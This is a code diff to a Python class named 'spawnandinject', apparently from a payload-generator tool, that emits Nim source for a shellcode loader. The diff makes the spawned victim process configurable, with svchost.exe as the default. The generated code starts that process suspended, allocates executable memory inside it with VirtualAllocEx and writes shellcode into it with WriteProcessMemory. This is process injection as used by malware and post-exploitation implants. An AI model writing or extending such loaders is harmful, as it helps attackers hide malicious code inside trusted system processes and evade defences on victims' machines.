@@ -5,6 +5,10 @@ class spawnandinject:
                 self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
             else:
                 self.memoryPermission = 'PAGE_EXECUTE_READ'
+        if 'target' in arguments:
+            self.target = arguments['target'].replace('\\','\\\\')
+        else:
+            self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
 
     def imports(self) -> list[str]:
         return ['import winim/lean']
@@ -26,7 +30,7 @@ proc main() =
 
     si.cb = sizeof(si).DWORD
 
-    CreateProcessA(nil, "C:\\\\windows\\\\system32\\\\svchost.exe", nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, &si, &pi)
+    CreateProcessA(nil, "{self.target}", nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, &si, &pi)
 
     let address = VirtualAllocEx(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, {self.memoryPermission})
     WriteProcessMemory(pi.hProcess, address, addr(shellcode[0]), {shellcodeSize}, nil)
